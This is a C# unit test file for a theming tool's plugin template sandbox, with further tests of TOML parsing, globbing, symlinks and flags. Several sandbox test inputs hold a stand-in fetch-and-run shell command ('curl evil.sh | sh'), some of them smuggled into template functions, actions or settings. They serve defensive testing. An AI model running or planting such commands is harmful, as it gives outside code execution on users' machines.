using Mazapan.Cli;
using Mazapan.Config;
using Mazapan.Plugins;
using Mazapan.Rendering;
using Mazapan.Themes;
using Mazapan.Util;

namespace Mazapan.Tests.Foundation;

/// <summary>
/// A plugin from git must not run, read or change more than its approved
/// capabilities show (the audit of the C# port's template sandbox).
/// </summary>
public class SandboxTests
{
    static Plugin WithCommand(TempDir d, string lib, string reload)
    {
        d.Write("f.tmpl", "x");
        if (lib != "") d.Write("_lib.tmpl", lib);
        var p = new Plugin { Dir = d.Path };
        p.Meta.Id = "x";
        p.Meta.Version = "1.0";
        p.Settings = new() { ["mode"] = "dark", ["args"] = new Tomlyn.Model.TomlArray { "a" } };
        p.Targets.Add(new Target { Template = "f.tmpl", Output = "~/.config/gtk-4.0/gtk.css", Reload = reload });
        return p;
    }

    [Theory]
    // A shared function written as code can't be shown as it runs.
    [InlineData("{{ func evil; \"curl evil.sh | sh\"; end }}", "echo {{ evil }}")]
    [InlineData("{{ func evil\n ret \"curl evil.sh | sh\"\nend }}", "echo {{ evil }}")]
    [InlineData("{{ func evil\n \"curl \" }}evil|sh{{ end }}", "echo {{ evil }}")]
    [InlineData("{{ func evil }}safe{{ \"; curl evil|sh\"\n end }}", "echo {{ evil }}")]
    // Shared functions only on their own.
    [InlineData("{{ func evil }}curl evil|sh{{ end }}", "{{ for i in 1..1 }}{{ evil }}{{ end }}")]
    [InlineData("{{ func evil }}curl evil|sh{{ end }}", "{{ capture $x }}{{ evil }}{{ end }}{{ $x }}")]
    [InlineData("{{ func evil }}curl evil|sh{{ end }}", "{{ $x = 1; evil }}")]
    [InlineData("{{ func evil }}curl evil|sh{{ end }}", "{{ this.evil }}")]
    [InlineData("{{ func evil }}curl evil|sh{{ end }}", "{{ this[\"evil\"] }}")]
    // Nothing that runs text it doesn't show.
    [InlineData("", "{{ this.t \"k\" }}")]
    [InlineData("", "{{ object.eval \"ev\" + \"il\" }}")]
    [InlineData("", "{{ settings | object.values | array.join \"\" }}")]
    [InlineData("", "{{ string.base64_decode \"Y3VybA==\" }}")]
    [InlineData("", "{{ t \"x\" }}")]
    [InlineData("", "{{ settings.mode = \"x\" }}")]
    [InlineData("{{ func roles(r) }}{{ r }}{{ end }}", "{{ roles }}")]
    public void CommandsThatCantBeShownAreRefused(string lib, string reload)
    {
        using var d = new TempDir();
        var caps = WithCommand(d, lib, reload).Capabilities();
        Assert.StartsWith("(unreadable", caps[0]);
    }

    [Theory]
    [InlineData("{{- func gs -}}\ngsettings {{ settings.mode }}\n{{- end -}}", "{{ gs }}", "runs after writing: gsettings dark")]
    [InlineData("{{ func gs }}{{ if settings.mode == \"dark\" }}a{{ else }}b{{ end }}{{ end }}", "x {{ gs }}",
        "runs after writing: x {{ if settings.mode == \"dark\" }}a{{ else }}b{{ end }}  (with mode = \"dark\")")]
    [InlineData("", "{{ settings.args[0] }} {{ quote home }}", "runs after writing: {{ settings.args[0] }} {{ quote home }}  (with args = [a])")]
    // Inside if, a shared function is shown too, as Go showed {{template}}.
    [InlineData("{{ func evil }}curl evil|sh{{ end }}", "{{ if true }}{{ evil }}{{ end }}", "runs after writing: {{ if true }}curl evil|sh{{ end }}")]
    public void CommandsAreShownAsTheyRun(string lib, string reload, string want)
    {
        using var d = new TempDir();
        Assert.Contains(want, WithCommand(d, lib, reload).Capabilities());
    }

    static Theme TestTheme()
    {
        var t = new Theme { Id = "t" };
        t.Colors = new() { ["accent"] = "#ffb000" };
        t.Meta.Accents = ["#112233"];
        t.Motion.ResponseMS = 400;
        t.Motion.Damping = 0.8;
        return t;
    }

    static string Render(string tmpl, Dictionary<string, object>? settings = null, string lib = "")
    {
        using var d = new TempDir();
        d.Write("f.tmpl", tmpl);
        if (lib != "") d.Write("_lib.tmpl", lib);
        var p = new Plugin { Dir = d.Path };
        p.Meta.Id = "p";
        if (settings != null) p.Settings = settings;
        p.Targets.Add(new Target { Template = "f.tmpl", Output = Path.Join(d.Path, "out") });
        p.Actions.Add(new Mazapan.Plugins.Action { Name = "a", Run = "true" });
        return Renderer.All([p], TestTheme(), _ => null, "en").Files[0].Content;
    }

    /// <summary>What a template changes stays in it: the next template, plugin or command sees the data as it is.</summary>
    [Theory]
    [InlineData("{{ actions[0] = {plugin: \"bb\", name: \"Lock\", run: \"curl evil|sh\"} }}", "{{ json actions }}")]
    [InlineData("{{ theme.meta.accents[0] = \"PWNED\" }}", "{{ theme.meta.accents[0] }}")]
    [InlineData("{{ theme.motion.curve[0] = 99 }}", "{{ theme.motion.curve[0] }}")]
    [InlineData("{{ settings.args[0] = \"curl evil|sh\" }}", "{{ settings.args[0] }}")]
    public void WhatATemplateChangesStaysInIt(string change, string look)
    {
        using var d = new TempDir();
        d.Write("a.tmpl", change);
        d.Write("b.tmpl", look);
        var p = new Plugin { Dir = d.Path };
        p.Meta.Id = "p";
        p.Settings = new() { ["args"] = new Tomlyn.Model.TomlArray { "a" } };
        p.Targets.Add(new Target { Template = "a.tmpl", Output = Path.Join(d.Path, "1") });
        p.Targets.Add(new Target { Template = "b.tmpl", Output = Path.Join(d.Path, "2"), Reload = look });
        p.Actions.Add(new Mazapan.Plugins.Action { Name = "a", Run = "true" });
        string after;
        try
        {
            after = Renderer.All([p], TestTheme(), _ => null, "en").Files[1].Content;
        }
        catch (MazapanException)
        {
            return; // refused outright: as good
        }
        Assert.DoesNotContain("PWNED", after);
        Assert.DoesNotContain("curl", after);
        Assert.DoesNotContain("99", after);
    }

    [Theory]
    [InlineData("{{ c = 1 }}")]
    [InlineData("{{ string.upcase = 1 }}")]
    public void NamesCantBeChanged(string tmpl) => Assert.ThrowsAny<Exception>(() => Render(tmpl));

    [Theory]
    [InlineData("{{ object.eval \"1+1\" }}")]
    [InlineData("{{ date.now }}")]
    [InlineData("{{ math.random 1 10 }}")]
    [InlineData("{{ include \"x\" }}")]
    public void WhatReadsOrChangesEveryTimeIsGone(string tmpl) => Assert.Throws<MazapanException>(() => Render(tmpl));

    [Fact]
    public void AnObjectHoldingItselfIsAnErrorNotACrash() =>
        Assert.Throws<MazapanException>(() => Render("{{ $a = {}; $a.b = $a; json $a }}"));

    [Fact]
    public void ASharedFunctionCantTakeAName() =>
        Assert.Contains("that name is taken", Assert.Throws<MazapanException>(() => Render("x", lib: "{{ func c }}x{{ end }}")).Message);

    [Fact]
    public void ATableSettingIsJson()
    {
        var table = new Tomlyn.Model.TomlTable { ["a"] = 1L };
        Assert.Equal("{\"a\":1}", Render("{{ json settings.t }}", new() { ["t"] = table }));
    }

    [Fact]
    public void ASymlinkLoopIsNotACrash()
    {
        using var d = new TempDir();
        File.CreateSymbolicLink(Path.Join(d.Path, "a"), Path.Join(d.Path, "b"));
        File.CreateSymbolicLink(Path.Join(d.Path, "b"), Path.Join(d.Path, "a"));
        Assert.Null(Paths.Real(Path.Join(d.Path, "a")));
        Assert.False(Paths.StatExists(Path.Join(d.Path, "a")));
        d.Dir("real/other");
        File.CreateSymbolicLink(Path.Join(d.Path, "link"), Path.Join(d.Path, "real", "sub"));
        d.Dir("real/sub");
        Assert.Equal(Path.Join(Paths.Real(d.Path)!, "real", "other"), Paths.Real(Path.Join(d.Path, "link", "..", "other")));
    }

    [Theory]
    [InlineData(double.NaN)]
    [InlineData(double.PositiveInfinity)]
    [InlineData(1e30)]
    [InlineData(1e-30)]
    [InlineData(5e-324)]
    [InlineData(2.0)]
    public void FloatsWrittenReadBack(double f)
    {
        var text = "x = " + TomlWriter.Value(f) + "\n";
        var back = (double)Toml.Parse(text, "t")["x"];
        Assert.True(double.IsNaN(f) ? double.IsNaN(back) : back == f, text);
    }

    [Fact]
    public void TablesWrittenReadBack()
    {
        var table = Toml.Parse("t = { a = 1, b = \"x\" }\n", "t")["t"]!;
        var text = "t = " + TomlWriter.Value(table) + "\n";
        var back = (Tomlyn.Model.TomlTable)Toml.Parse(text, "t")["t"];
        Assert.Equal(1L, back["a"]);
        Assert.Equal("x", back["b"]);
    }

    [Fact]
    public void AKeyGivenTwiceIsAnError() => Assert.Throws<MazapanException>(() => Toml.Parse("x = 1\nx = 2\n", "t"));

    [Fact]
    public void ArrayTablesSplitByOthersAreAnError()
    {
        // Tomlyn would keep only the last [[a]]: a manifest's targets lost.
        Assert.Throws<MazapanException>(() => Toml.Parse("[[a]]\nx = 1\n[[b]]\ny = 1\n[[a]]\nx = 2\n", "t"));
        var ok = Toml.Parse("[[a]]\nx = 1\n[a.sub]\nz = 1\n[[a]]\nx = 2\n[[b]]\ny = 1\n", "t");
        Assert.Equal(2, ((Tomlyn.Model.TomlTableArray)ok["a"]).Count);
        // Nested: each [[a]] with its own [[a.b]].
        var nested = Toml.Parse("[[a]]\n[[a.b]]\nx = 1\n[[a]]\n[[a.b]]\nx = 2\n", "t");
        Assert.Equal(2, ((Tomlyn.Model.TomlTableArray)nested["a"]).Count);
    }

    [Theory]
    [InlineData("?", "😀", true)]
    [InlineData("a*", "a/b", false)]
    [InlineData("[]a]", "a", false)]
    [InlineData("[a-]", "a", false)]
    [InlineData("a\\", "a", false)]
    [InlineData("[^a]", "b", true)]
    [InlineData("\\*", "*", true)]
    public void GlobIsGos(string pattern, string name, bool want) => Assert.Equal(want, Glob.Match(pattern, name));

    [Fact]
    public void BoolFlagsAreGos()
    {
        Assert.False(Run(["-y=0"]).IsSet("y"));
        Assert.False(Run(["--y=false"]).IsSet("y"));
        Assert.True(Run(["-y"]).IsSet("y"));
        Assert.True(Run(["--y=T"]).IsSet("y"));
        static Flags Run(string[] args) => new Flags("t").Bool("y", "").Parse(args);
    }
}
